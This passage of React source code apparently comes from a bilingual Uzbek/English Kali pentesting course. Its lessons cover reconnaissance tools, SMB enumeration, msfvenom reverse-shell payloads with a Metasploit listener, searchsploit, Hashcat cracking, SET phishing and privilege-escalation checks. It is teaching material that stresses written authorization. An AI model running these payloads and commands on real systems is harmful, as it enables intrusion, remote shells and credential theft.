  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"WhatWeb nima?","What is WhatWeb?")),
    React.createElement(P,null,t(lang,
      "WhatWeb — veb-saytning \"ostida\" qanday texnologiyalar ishlayotganini aniqlaydi: CMS (WordPress, Joomla), veb-server (Apache, Nginx), dasturlash tili, JavaScript kutubxonalari, analitika va hatto versiyalar. Bu zaifliklarni izlashning boshlanish nuqtasi.",
      "WhatWeb identifies which technologies run 'under the hood' of a website: CMS (WordPress, Joomla), web server (Apache, Nginx), programming language, JavaScript libraries, analytics and even versions. This is the starting point for finding vulnerabilities."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Foydalanish","Usage")),
    React.createElement(Terminal,null,
      "# Oddiy tekshiruv\nwhatweb example.com\n\n# Batafsil (verbose) — ko'proq ma'lumot\nwhatweb -v example.com\n\n# Agressivlik darajasi (3 = ko'proq so'rov, aniqroq)\nwhatweb -a 3 example.com\n\n# Ko'p saytni birdan (fayldan)\nwhatweb -i targets.txt"
    ),
    React.createElement(P,null,t(lang,
      "Masalan, WhatWeb saytda \"WordPress 5.2\" ekanini aniqlasa, siz o'sha aniq versiyaga tegishli ma'lum zaifliklarni (searchsploit wordpress 5.2) izlashingiz mumkin. Texnologiya + versiya = maqsadli hujum.",
      "For example, if WhatWeb detects 'WordPress 5.2' on a site, you can look up known vulnerabilities for that exact version (searchsploit wordpress 5.2). Technology + version = a targeted attack."
    )),
    React.createElement(Quiz,{
      q:{uz:"WhatWeb asosan nimani aniqlaydi?",en:"What does WhatWeb primarily identify?"},
      opts:[{uz:"Parol hashlarini",en:"Password hashes"},{uz:"Veb-saytning texnologiya stekini",en:"A website's technology stack"},{uz:"Ochiq UDP portlarni",en:"Open UDP ports"},{uz:"WiFi parollarini",en:"WiFi passwords"}],
      correct:1,
      exp:{uz:"WhatWeb veb-sayt ortidagi texnologiyalarni (CMS, server, til, kutubxonalar va versiyalar) aniqlaydi — bu maqsadli zaiflik izlash uchun asos beradi.",en:"WhatWeb detects the technologies behind a website (CMS, server, language, libraries and versions) — providing a basis for targeted vulnerability research."}
    })
  );
}

// ── L18: enum4linux ───────────────────────────────────────────
function LessonL18(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"enum4linux nima?","What is enum4linux?")),
    React.createElement(P,null,t(lang,
      "enum4linux — Windows va Samba tizimlaridan SMB protokoli orqali ma'lumot to'playdigan vosita. U foydalanuvchilar ro'yxati, guruhlar, ulashilgan papkalar (shares), parol siyosati va operatsion tizim ma'lumotlarini chiqarib olishga urinadi — ko'pincha autentifikatsiyasiz (null session).",
      "enum4linux gathers information from Windows and Samba systems over the SMB protocol. It attempts to extract the user list, groups, shared folders (shares), password policy and OS details — often without authentication (a null session)."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Foydalanish","Usage")),
    React.createElement(Terminal,null,
      "# To'liq enumeratsiya (barcha tekshiruvlar)\nenum4linux -a 10.0.0.5\n\n# Faqat foydalanuvchilar\nenum4linux -U 10.0.0.5\n\n# Faqat ulashilgan papkalar\nenum4linux -S 10.0.0.5\n\n# Zamonaviy Python versiyasi\nenum4linux-ng -A 10.0.0.5"
    ),
    React.createElement(P,null,t(lang,
      "\"Null session\" — bu foydalanuvchi nomi va parolsiz SMB'ga ulanish. Eski yoki noto'g'ri sozlangan Windows tizimlari null session'ga ruxsat beradi va bu butun foydalanuvchilar ro'yxatini ochib berishi mumkin.",
      "A 'null session' is a connection to SMB with no username or password. Old or misconfigured Windows systems allow null sessions, which can leak the entire user list."
    )),
    React.createElement(InfoBox,{color:"var(--c-warn)"},
      React.createElement("strong",null,"⚠ "),
      t(lang,"enum4linux 139 va 445 portlar (SMB) ochiq bo'lganda ishlaydi. Topilgan foydalanuvchi ismlari keyinchalik parol hujumlari uchun ishlatilishi mumkin — faqat ruxsat berilgan nishonlarda.",
        "enum4linux works when ports 139 and 445 (SMB) are open. Discovered usernames may later be used in password attacks — only on authorized targets.")
    ),
    React.createElement(Quiz,{
      q:{uz:"enum4linux qaysi protokol orqali ma'lumot to'playdi?",en:"Over which protocol does enum4linux gather information?"},
      opts:[{uz:"SMB",en:"SMB"},{uz:"DNS",en:"DNS"},{uz:"SMTP",en:"SMTP"},{uz:"SNMP",en:"SNMP"}],
      correct:0,
      exp:{uz:"enum4linux SMB protokoli (139/445 portlar) orqali Windows/Samba tizimlaridan foydalanuvchilar, guruhlar va ulashmalarni sanaydi.",en:"enum4linux uses the SMB protocol (ports 139/445) to enumerate users, groups and shares from Windows/Samba systems."}
    })
  );
}

// ── L19: SMB enumeration ──────────────────────────────────────
function LessonL19(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"SMB va nima uchun muhim","SMB and why it matters")),
    React.createElement(P,null,t(lang,
      "SMB (Server Message Block) — Windows tarmoqlarida fayl va printerlarni ulashish protokoli. U 445-portda ishlaydi va korporativ tarmoqlarda hamma joyda uchraydi. Noto'g'ri sozlangan SMB ulashmalari maxfiy fayllar, parollar va konfiguratsiyalarni ochib berishi mumkin.",
      "SMB (Server Message Block) is the file and printer sharing protocol in Windows networks. It runs on port 445 and is everywhere in corporate networks. Misconfigured SMB shares can expose confidential files, passwords and configurations."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Ulashmalarni sanash","Enumerating shares")),
    React.createElement(Terminal,null,
      "# Ulashmalar ro'yxati (anonim)\nsmbclient -L //10.0.0.5 -N\n\n# Barcha xostlarda ulashmalarni xaritalash\nsmbmap -H 10.0.0.5\n\n# Nmap SMB skriptlari\nnmap --script smb-enum-shares,smb-os-discovery -p445 10.0.0.5"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Ulashmaga ulanish","Connecting to a share")),
    React.createElement(Terminal,null,
      "# Muayyan ulashmaga ulanish\nsmbclient //10.0.0.5/Documents -N\n\n# Ichida: fayllarni ko'rish va yuklab olish\nsmb: \\> ls\nsmb: \\> get maxfiy.txt\nsmb: \\> exit"
    ),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"EternalBlue: ","EternalBlue: ")),
      t(lang,"Eski SMBv1 (MS17-010, EternalBlue) tarixdagi eng mashhur zaifliklardan biri. nmap --script smb-vuln-ms17-010 bilan tekshirib ko'ring — u hali ham ko'p eski tizimlarda ochiq.",
        "The old SMBv1 (MS17-010, EternalBlue) is one of the most famous vulnerabilities in history. Check for it with nmap --script smb-vuln-ms17-010 — it is still open on many legacy systems.")
    ),
    React.createElement(Quiz,{
      q:{uz:"SMB protokoli qaysi asosiy portda ishlaydi?",en:"On which main port does the SMB protocol run?"},
      opts:[{uz:"22",en:"22"},{uz:"80",en:"80"},{uz:"445",en:"445"},{uz:"53",en:"53"}],
      correct:2,
      exp:{uz:"SMB asosan 445-portda (eski hollarda 139) ishlaydi va Windows tarmoqlarida fayl ulashish uchun ishlatiladi.",en:"SMB runs mainly on port 445 (139 in legacy cases) and is used for file sharing in Windows networks."}
    })
  );
}


// ── L22: msfvenom ─────────────────────────────────────────────
function LessonL22(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"msfvenom nima?","What is msfvenom?")),
    React.createElement(P,null,t(lang,
      "msfvenom — Metasploit tarkibidagi payload (yuk) generatori. U turli formatlarda (.exe, .elf, .apk, .php) bajariladigan zararli yuklarni yaratadi. Bu yuklar nishonda ishga tushganda hujumchiga teskari ulanish (reverse shell) beradi. Bu vosita faqat ta'lim va ruxsat berilgan pentest uchun.",
      "msfvenom is the payload generator inside Metasploit. It creates executable payloads in various formats (.exe, .elf, .apk, .php). When run on a target these payloads give the attacker a reverse connection (reverse shell). This tool is only for education and authorized pentesting."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Payload yaratish","Generating a payload")),
    React.createElement(Terminal,null,
      "# Umumiy shakl: -p payload LHOST=... LPORT=... -f format\n\n# Windows reverse shell (.exe)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=10.0.0.10 LPORT=4444 -f exe -o shell.exe\n\n# Linux (.elf)\nmsfvenom -p linux/x64/shell_reverse_tcp \\\n  LHOST=10.0.0.10 LPORT=4444 -f elf -o shell.elf\n\n# PHP veb-shell\nmsfvenom -p php/reverse_php LHOST=10.0.0.10 LPORT=4444 -f raw -o shell.php"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Ulanishni qabul qilish","Catching the connection")),
    React.createElement(P,null,t(lang,
      "Yuk nishonda ishga tushganda, u sizga qaytib ulanadi. Bu ulanishni qabul qilish uchun Metasploit'da tinglovchi (listener) sozlanadi:",
      "When the payload runs on the target, it connects back to you. To catch this connection you set up a listener (handler) in Metasploit:"
    )),
    React.createElement(Terminal,null,
      "msfconsole -q\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.10\nset LPORT 4444\nrun"
    ),
    React.createElement(InfoBox,{color:"var(--c-warn)"},
      React.createElement("strong",null,"⚠ "),
      t(lang,"LHOST — sizning (hujumchi) IP manzilingiz, LPORT — siz tinglayotgan port. Bunday yuklarni faqat o'zingizga tegishli laboratoriya yoki yozma ruxsat berilgan nishonlarda sinang.",
        "LHOST is your (the attacker's) IP, LPORT is the port you listen on. Only test such payloads in your own lab or on targets with written authorization.")
    ),
    React.createElement(Quiz,{
      q:{uz:"msfvenom buyrug'ida LHOST nimani bildiradi?",en:"In an msfvenom command, what does LHOST specify?"},
      opts:[{uz:"Nishonning IP manzili",en:"The target's IP address"},{uz:"Hujumchining (tinglovchining) IP manzili",en:"The attacker's (listener's) IP address"},{uz:"Lokal fayl nomi",en:"A local file name"},{uz:"Payload turi",en:"The payload type"}],
      correct:1,
      exp:{uz:"LHOST — teskari ulanish qaytadigan manzil, ya'ni hujumchining o'z IP'si. Nishon yuk ishga tushganda shu manzilga ulanadi.",en:"LHOST is the address the reverse connection returns to — the attacker's own IP. The target connects to it when the payload runs."}
    })
  );
}

// ── L23: searchsploit & Exploit-DB ────────────────────────────
function LessonL23(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Exploit-DB va searchsploit","Exploit-DB and searchsploit")),
    React.createElement(P,null,t(lang,
      "Exploit-DB — dunyodagi eng katta ochiq ekspluatatsiya arxivi. searchsploit esa uning nusxasini Kali'da oflayn qidirish imkonini beradigan vosita. Nishon dasturi va versiyasini bilganingizdan so'ng, unga tegishli tayyor ekspluatatsiyani shu yerdan topasiz.",
      "Exploit-DB is the world's largest public archive of exploits. searchsploit is the tool that lets you search a local copy of it offline in Kali. Once you know the target's software and version, you find a matching ready-made exploit here."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Qidirish","Searching")),
    React.createElement(Terminal,null,
      "# Dastur nomi bo'yicha qidirish\nsearchsploit apache 2.4\n\n# Aniq qidiruv (nomida)\nsearchsploit -t wordpress\n\n# Ma'lumotlar bazasini yangilash\nsearchsploit -u"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Ekspluatatsiyani ko'rish va nusxalash","Viewing and copying an exploit")),
    React.createElement(Terminal,null,
      "# Ekspluatatsiya kodini o'qish\nsearchsploit -x php/webapps/50123.php\n\n# Uni joriy katalogga nusxalash\nsearchsploit -m 50123\n\n# Endi kodni tahlil qilib, sozlab ishga tushirasiz"
    ),
    React.createElement(InfoBox,{color:"var(--c-warn)"},
      React.createElement("strong",null,"⚠ "),
      t(lang,"Internetdan olingan ekspluatatsiya kodini ko'r-ko'rona ishga tushirmang — avval uni o'qib, nima qilishini tushuning. Ba'zi \"ekspluatatsiyalar\" aslida sizning mashinangizga qarshi zararli kod bo'lishi mumkin.",
        "Never blindly run exploit code from the internet — read it first and understand what it does. Some 'exploits' are actually malicious code aimed at your own machine.")
    ),
    React.createElement(Quiz,{
      q:{uz:"searchsploit asosan nima uchun ishlatiladi?",en:"What is searchsploit mainly used for?"},
      opts:[{uz:"Portlarni skanerlash",en:"Scanning ports"},{uz:"Ma'lum dastur/versiyaga tayyor ekspluatatsiyalarni topish",en:"Finding ready-made exploits for a known software/version"},{uz:"Parollarni buzish",en:"Cracking passwords"},{uz:"Trafikni tinglash",en:"Sniffing traffic"}],
      correct:1,
      exp:{uz:"searchsploit Exploit-DB ning lokal nusxasidan ma'lum dastur va versiyaga mos ekspluatatsiyalarni oflayn qidiradi.",en:"searchsploit searches a local copy of Exploit-DB offline for exploits matching a known software and version."}
    })
  );
}

// ── L26: Hashcat ──────────────────────────────────────────────
function LessonL26(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Hashcat nima?","What is Hashcat?")),
    React.createElement(P,null,t(lang,
      "Hashcat — dunyodagi eng tezkor parol hash buzuvchi. U GPU (video karta) quvvatidan foydalanib, sekundiga milliardlab parolni sinaydi. John the Ripper kabi oflayn ishlaydi, lekin katta hajmdagi ishlar uchun ancha tezroq.",
      "Hashcat is the world's fastest password-hash cracker. Using GPU (graphics card) power, it tries billions of passwords per second. Like John the Ripper it works offline, but is far faster for large jobs."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Hujum rejimlari","Attack modes")),
    React.createElement("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(200px,1fr))",gap:10,margin:"12px 0 16px"}},
      [["-a 0",t(lang,"Lug'at hujumi (wordlist)","Dictionary (wordlist)")],
       ["-a 3",t(lang,"Brute-force (maska bilan)","Brute-force (mask)")],
       ["-a 6",t(lang,"Wordlist + maska","Wordlist + mask")],
       ["-a 1",t(lang,"Kombinatsiya (ikki wordlist)","Combinator (two wordlists)")]].map((x,i)=>
        React.createElement("div",{key:i,style:{background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,padding:"11px 14px"}},
          React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:12,fontWeight:700,color:"var(--accent)"}},x[0]),
          React.createElement("div",{style:{fontSize:12,color:"var(--text-2)",marginTop:4}},x[1])))
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Foydalanish","Usage")),
    React.createElement(Terminal,null,
      "# Lug'at hujumi (-m = hash turi, 0 = MD5)\nhashcat -m 0 -a 0 hashes.txt rockyou.txt\n\n# NTLM hashlar (-m 1000)\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt\n\n# Maska hujumi: 8 belgi, harf+raqam\nhashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a\n\n# Buzilganlarni ko'rish\nhashcat -m 0 hashes.txt --show"
    ),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"Hash turini aniqlash: ","Identifying the hash type: ")),
      t(lang,"To'g'ri -m qiymatini tanlash muhim. hashid yoki hash-identifier vositalari hash turini aniqlashga yordam beradi. Hashcat wiki'da barcha -m raqamlari ro'yxati bor.",
        "Choosing the right -m value is important. The hashid or hash-identifier tools help determine the hash type. The Hashcat wiki lists all -m numbers.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Hashcat John the Ripper'dan asosiy farqi nimada?",en:"What is Hashcat's main difference from John the Ripper?"},
      opts:[{uz:"U onlayn ishlaydi",en:"It works online"},{uz:"U GPU quvvatidan foydalanib ancha tezroq",en:"It uses GPU power and is much faster"},{uz:"U faqat MD5 buzadi",en:"It only cracks MD5"},{uz:"U parol yaratadi",en:"It creates passwords"}],
      correct:1,
      exp:{uz:"Hashcat GPU'dan foydalanib sekundiga milliardlab parolni sinaydi — bu uni katta ishlar uchun John'dan ancha tezroq qiladi. Ikkalasi ham oflayn.",en:"Hashcat leverages the GPU to try billions of passwords per second, making it much faster than John for large jobs. Both are offline."}
    })
  );
}

// ── L28: Social Engineering (SET) ─────────────────────────────
function LessonL28(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Ijtimoiy muhandislik va SET","Social engineering and SET")),
    React.createElement(P,null,t(lang,
      "Ijtimoiy muhandislik — texnik zaifliklar emas, balki insonlarni aldash orqali hujum qilish. Eng kuchli himoya ham bitta ishonuvchan xodim tufayli buziladi. SET (Social-Engineer Toolkit) — bunday hujum stsenariylarini (phishing, soxta saytlar) yaratish uchun Kali vositasi.",
      "Social engineering means attacking by deceiving people rather than exploiting technical flaws. Even the strongest defense breaks because of one trusting employee. SET (Social-Engineer Toolkit) is a Kali tool for building such attack scenarios (phishing, fake sites)."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Keng tarqalgan texnikalar","Common techniques")),
    React.createElement("div",{style:{marginBottom:16}},
      [[t(lang,"Phishing","Phishing"),t(lang,"Soxta email orqali ma'lumot yoki parol o'g'irlash","Stealing info or passwords via fake email")],
       [t(lang,"Pretexting","Pretexting"),t(lang,"Ishonchli yolg'on stsenariy o'ylab topish (masalan IT xodimi)","Inventing a believable false scenario (e.g. IT staff)")],
       [t(lang,"Baiting","Baiting"),t(lang,"Qiziqtiruvchi 'o'lja' (masalan zararli USB) qoldirish","Leaving an enticing 'bait' (e.g. a malicious USB)")],
       [t(lang,"Credential Harvesting","Credential Harvesting"),t(lang,"Haqiqiy saytning soxta nusxasi bilan login o'g'irlash","Stealing logins with a fake clone of a real site")]].map((x,i)=>
        React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10}},
          React.createElement("span",{style:{fontSize:13,fontWeight:700,color:"var(--accent)",minWidth:150}},x[0]),
          React.createElement("span",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.5}},x[1])))
    ),
    React.createElement(Terminal,null,
      "# SET'ni ishga tushirish\nsudo setoolkit\n\n# Menyu: 1) Social-Engineering Attacks\n#        2) Website Attack Vectors\n#        3) Credential Harvester Method"
    ),
    React.createElement(InfoBox,{color:"var(--c-warn)"},
      React.createElement("strong",null,"⚠ "),
      t(lang,"Ijtimoiy muhandislik hujumlari faqat rasmiy, yozma ruxsat berilgan pentest doirasida (masalan tashkilotning o'z xodimlarini sinash) o'tkazilishi mumkin. Aks holda bu firibgarlik va jinoyat hisoblanadi.",
        "Social engineering attacks may only be conducted within a formal, written-authorized pentest scope (e.g. testing an organization's own employees). Otherwise it is fraud and a crime.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Ijtimoiy muhandislik hujumi nimaga asoslanadi?",en:"What does a social engineering attack rely on?"},
      opts:[{uz:"Dasturiy zaifliklarga",en:"Software vulnerabilities"},{uz:"Insonlarni aldash va ishonchdan foydalanishga",en:"Deceiving people and abusing trust"},{uz:"Tarmoq portlariga",en:"Network ports"},{uz:"Shifrlash xatolariga",en:"Encryption flaws"}],
      correct:1,
      exp:{uz:"Ijtimoiy muhandislik texnik emas, insoniy omilga qaratilgan — u odamlarni aldab, maxfiy ma'lumot yoki kirish huquqini berishga undaydi.",en:"Social engineering targets the human factor, not the technical one — it tricks people into handing over sensitive info or access."}
    })
  );
}

// ── L29: Privilege escalation ─────────────────────────────────
function LessonL29(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Imtiyozlarni oshirish nima?","What is privilege escalation?")),
    React.createElement(P,null,t(lang,
      "Imtiyozlarni oshirish (privesc) — tizimga oddiy foydalanuvchi sifatida kirgandan so'ng, root (Linux) yoki Administrator (Windows) huquqlarini qo'lga kiritish jarayoni. Ko'p hujumlar past imtiyozli kirish bilan boshlanadi; privesc esa to'liq nazoratni beradi.",
      "Privilege escalation (privesc) is the process of gaining root (Linux) or Administrator (Windows) rights after entering a system as a normal user. Many attacks start with low-privilege access; privesc gives full control."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Linux privesc — tekshiruv nuqtalari","Linux privesc — check points")),
    React.createElement(Terminal,null,
      "# Menda qanday sudo huquqlari bor?\nsudo -l\n\n# SUID o'rnatilgan fayllar (GTFOBins bilan solishtiring)\nfind / -perm -4000 -type f 2>/dev/null\n\n# Yozish mumkin bo'lgan cron ishlari\nls -la /etc/cron*\n\n# Kernel versiyasi (ma'lum ekspluatatsiya bormi?)\nuname -a"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Avtomatlashtirilgan vositalar","Automated tools")),
    React.createElement(Terminal,null,
      "# LinPEAS — Linux privesc tekshiruvchi\n./linpeas.sh\n\n# Linux Exploit Suggester — kernel ekspluatatsiyalarini taklif qiladi\n./linux-exploit-suggester.sh\n\n# Windows uchun: winPEAS.exe, PowerUp.ps1"
    ),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"GTFOBins: ","GTFOBins: ")),
      t(lang,"gtfobins.github.io — SUID yoki sudo huquqi bilan ishlaydigan oddiy dasturlarni (vim, find, less) qanday qilib root olishga aylantirish mumkinligini ko'rsatuvchi bebaho ma'lumotnoma.",
        "gtfobins.github.io — an invaluable reference showing how ordinary programs (vim, find, less) with SUID or sudo rights can be turned into root access.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Linux'da imtiyozlarni oshirishning eng birinchi tekshiruvi qaysi?",en:"What is one of the very first privilege-escalation checks on Linux?"},
      opts:[{uz:"sudo -l bilan sudo huquqlarini ko'rish",en:"Checking sudo rights with sudo -l"},{uz:"Kompyuterni o'chirish",en:"Shutting down the computer"},{uz:"Brauzerni ochish",en:"Opening a browser"},{uz:"Fonni o'zgartirish",en:"Changing the wallpaper"}],
      correct:0,
      exp:{uz:"sudo -l joriy foydalanuvchiga qanday sudo huquqlari berilganini ko'rsatadi — bu ko'pincha root'ga tez yo'l ochadi.",en:"sudo -l shows what sudo rights the current user has — this often opens a quick path to root."}
    })
  );
}

// ── L30: Covering tracks & reporting ──────────────────────────
function LessonL30(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Pentestning yakuniy bosqichi","The final phase of a pentest")),
    React.createElement(P,null,t(lang,
      "Haqiqiy hujumchilar izlarini yashiradi, lekin professional pentesterning eng muhim mahsuloti — hisobot. Sizning topilmalaringiz tushunarli, takrorlanadigan va tuzatib bo'ladigan tarzda hujjatlashtirilmasa, butun ish qiymatini yo'qotadi.",
      "Real attackers cover their tracks, but a professional pentester's most important deliverable is the report. If your findings aren't documented in a clear, reproducible and fixable way, the entire engagement loses its value."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Izlarni yashirish (nazariy)","Covering tracks (conceptual)")),
    React.createElement(P,null,t(lang,
      "Hujumchilar loglarni tozalaydi va vaqt belgilarini o'zgartiradi. Mudofaachi (blue team) sifatida buni tushunish muhim — bu qaysi loglar himoyalanishi kerakligini ko'rsatadi. Pentestda esa siz bajargan barcha amallar hisobotda ochiq qayd etiladi, yashirilmaydi.",
      "Attackers clear logs and alter timestamps. As a defender (blue team) it's important to understand this — it shows which logs must be protected. In a pentest, however, every action you take is openly recorded in the report, not hidden."
    )),
    React.createElement(Terminal,null,
      "# Log fayllar odatda shu yerda (blue team bilishi shart):\n/var/log/auth.log     # kirish urinishlari\n/var/log/syslog       # umumiy tizim\n~/.bash_history       # kiritilgan buyruqlar\n\n# Himoya: loglarni markazlashtirilgan SIEM'ga uzatish"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Professional hisobot tuzilishi","Professional report structure")),
    React.createElement("div",{style:{marginBottom:16}},
      [["1. Executive Summary",t(lang,"Rahbariyat uchun texnik bo'lmagan qisqacha xulosa","Non-technical summary for management")],
       ["2. Scope & Methodology",t(lang,"Nima test qilingani va qanday usulda","What was tested and how")],
       ["3. Findings",t(lang,"Har bir zaiflik: tavsif, jiddiylik (CVSS), isbot","Each vuln: description, severity (CVSS), proof")],
       ["4. Remediation",t(lang,"Har bir zaiflikni qanday tuzatish bo'yicha aniq tavsiyalar","Concrete fix recommendations per vuln")]].map((x,i)=>
        React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10}},
          React.createElement("span",{style:{fontSize:13,fontWeight:700,color:"var(--accent)",minWidth:180}},x[0]),
          React.createElement("span",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.5}},x[1])))
    ),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"Isbot (PoC): ","Proof of concept: ")),
      t(lang,"Har bir topilma skrinshot, buyruq va qadamlar bilan hujjatlashtirilishi kerak, toki mijoz uni o'zi takrorlab, tuzatgach yana sinab ko'ra olsin. Hisobotsiz pentest — tugallanmagan pentest.",
        "Every finding should be documented with screenshots, commands and steps so the client can reproduce it, fix it, then retest. A pentest without a report is an unfinished pentest.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Professional pentesterning eng muhim yakuniy mahsuloti nima?",en:"What is a professional pentester's most important final deliverable?"},
      opts:[{uz:"Buzilgan tizimlar soni",en:"The number of systems breached"},{uz:"Aniq, takrorlanadigan va tuzatib bo'ladigan hisobot",en:"A clear, reproducible and fixable report"},{uz:"O'g'irlangan parollar",en:"Stolen passwords"},{uz:"Tozalangan loglar",en:"Cleared logs"}],
      correct:1,
      exp:{uz:"Pentestning qiymati hisobotda — topilmalar tushunarli, isbotlangan va tuzatish tavsiyalari bilan hujjatlashtirilishi shart.",en:"The value of a pentest is in the report — findings must be documented clearly, with proof and remediation guidance."}
    })
  );
}

const root=ReactDOM.createRoot(document.getElementById("app"));
root.render(React.createElement(App));

/* ── Animated background particles (matches Windows module) ── */
(function(){
  function initBgParticles(){
    var el=document.getElementById("bg-root");
    if(!el) return;
    el.className="bg-stage bg-grid bg-scan";
    [].slice.call(el.querySelectorAll(".particle")).forEach(function(p){p.remove();});
    var count=30;
    for(var i=0;i<count;i++){
      var p=document.createElement("div");
      var isStar=i%5===0;
      p.className="particle"+(isStar?" particle-star":"");
      var s=isStar?3+Math.random()*3:1+Math.random()*2;
      p.style.width=p.style.height=s+"px";
      p.style.left=(Math.random()*100)+"%";
      p.style.top=(Math.random()*100)+"%";
      var angle=Math.random()*Math.PI*2;
      var dist=120+Math.random()*220;
      p.style.setProperty("--dx",(Math.cos(angle)*dist)+"px");
      p.style.setProperty("--dy",(Math.sin(angle)*dist-80)+"px");
      p.style.animationDuration=(isStar?20:12+Math.random()*20)+"s";
      p.style.animationDelay=(-Math.random()*35)+"s";
      el.appendChild(p);
    }
  }
  if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",initBgParticles);}
  else{initBgParticles();}
})();
